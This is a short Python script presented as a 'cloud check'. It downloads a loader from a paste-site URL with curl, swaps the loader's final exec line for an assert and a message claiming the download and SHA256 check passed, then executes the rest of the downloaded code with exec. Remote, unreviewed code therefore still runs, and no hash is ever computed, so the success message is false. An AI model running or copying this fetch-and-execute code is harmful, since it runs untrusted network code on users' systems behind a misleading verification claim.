from pathlib import Path
import subprocess
loader=subprocess.check_output(['curl','-fsSL','https://paste.rs/sBwkf'],timeout=30).decode()
check=loader.replace("exec(compile(data,'verified-web-update','exec'),{'__name__':'__main__'})", "assert b'\\r' not in data; print('Linux cloud download and SHA256 passed')")
exec(compile(check,'cloud-check','exec'))
